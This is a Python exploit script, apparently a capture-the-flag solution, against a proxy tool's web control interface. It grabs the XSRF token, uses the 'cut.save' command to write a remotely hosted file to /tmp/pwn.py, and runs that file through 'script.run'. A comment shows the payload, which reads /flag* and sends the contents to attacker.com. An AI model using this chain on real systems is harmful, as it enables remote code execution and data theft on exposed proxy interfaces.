import requests
import re

PROXY_URL = "http://localhost:8080/"
WEB_URL = "http://localhost:8081/"

s = requests.session()

s.proxies = {
  "http": PROXY_URL
}

r = s.get(WEB_URL)
xsrf = re.findall(r'<input type="hidden" name="_xsrf" value="(.+)"/>', r.text)[0]

r = s.post(WEB_URL, data={
  "token": "this_is_the_same_in_remote",
  "_xsrf": xsrf
})

# http://attacker.com/pwn.pyの内容

# import urllib.request
# import os

# urllib.request.urlopen("http://attacker.com/?flag=" + os.popen("cat /flag*").read())


r = s.get("http://attacker.com/pwn.py")

r = s.post(WEB_URL + "commands/cut.save", json={
  "arguments": ["~d attacker.com", "response.text", "/tmp/pwn.py"],  
},
headers={
  "x-xsrftoken": xsrf
})

r = s.post(WEB_URL + "commands/script.run", json={
  "arguments": ["@marked", "/tmp/pwn.py"],  
},
headers={
  "x-xsrftoken": xsrf
})